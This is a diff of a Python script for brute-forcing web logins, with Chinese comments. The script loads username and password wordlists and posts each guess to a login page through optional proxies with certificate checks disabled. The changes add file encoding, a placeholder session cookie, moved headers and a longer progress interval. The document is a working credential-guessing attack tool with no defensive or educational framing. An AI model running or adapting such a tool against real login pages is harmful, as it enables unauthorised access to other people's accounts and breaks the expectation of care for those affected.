@@ -23,7 +23,7 @@ PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_FILE_PATH
 #USERNAME_FILE_PATH = "/root/bruteforce/username.txt"
 #PASSWORD_FILE_PATH = "/root/bruteforce/password.txt"
 #USERNAME_FILE_PATH = "D:\\Bruteforce\\username.txt"
-PASSWORD_FILE_PATH = "D:\\Bruteforce\\password.txt"
+#PASSWORD_FILE_PATH = "D:\\Bruteforce\\password.txt"
 
 # 只爆破一个账号
 ONLY_ONCE = False
@@ -46,7 +46,7 @@ PROXIES = {
 # 加载用户名字典
 if 'USERNAME_FILE_PATH' in vars() and USERNAME_FILE_PATH:
     try:
-        with open(USERNAME_FILE_PATH, "r") as f:
+        with open(USERNAME_FILE_PATH, "r", encoding="utf-8") as f:
             USERNAME.extend(f.readlines())
     except Exception as e:
         print(f"[x] Cannot open '{USERNAME_FILE_PATH}' file {e}")
@@ -55,17 +55,11 @@ if 'USERNAME_FILE_PATH' in vars() and USERNAME_FILE_PATH:
 # 加载密码字典
 if 'PASSWORD_FILE_PATH' in vars() and PASSWORD_FILE_PATH:
     try:
-        with open(PASSWORD_FILE_PATH, "r") as f:
+        with open(PASSWORD_FILE_PATH, "r", encoding="utf-8") as f:
             PASSWORD.extend(f.readlines())
     except Exception as e:
         print(f"[x] Cannot open '{PASSWORD_FILE_PATH}' file {e}")
         os._exit(0)
-
-# 设置Headers
-HEADERS = requests.utils.default_headers()
-HEADERS.update({
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
-})
 
 #
 # =================== [ 工具函数 ] ===================
@@ -116,6 +110,17 @@ YwIDAQAB
 # =================== [ 爆破函数 ] ===================
 #
 
+# 设置Headers
+HEADERS = requests.utils.default_headers()
+HEADERS.update({
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
+})
+
+# 设置Cookies
+COOKIES = {
+    'PHPSESSIONID': '0xDEADBEEF'
+}
+
 # 爆破函数，返回 (has_exception, found_password)
 def run(username, password):
 
@@ -134,14 +139,14 @@ def run(username, password):
 
     try:
         # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
-        #response = session.get("https://example.com/login.html", headers=HEADERS, timeout=10, 
+        #response = session.get("https://example.com/login.html", headers=HEADERS, cookies=COOKIES, timeout=10, 
         #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
 
         data = {
             "username": username,
             "password": password
         }
-        response = session.post("https://example.com/login.html", data=data, headers=HEADERS, timeout=10, 
+        response = session.post("https://example.com/login.html", data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
             allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
 
         # if len(response.content) != 61:
@@ -249,7 +254,7 @@ def report_elapsed_time():
 
     # 死循环汇报时间
     while True:
-        if True == REPORT_THREAD_STOP_SIGNAL.wait(timeout=30.0):
+        if True == REPORT_THREAD_STOP_SIGNAL.wait(timeout=60.0):
             break
         print(f"[!] {datetime.now().strftime('%H:%M:%S')} {FINISHED_COUNT}/{TOTAL_COUNT} ({FINISHED_COUNT * 100 // TOTAL_COUNT}%) finished")
 
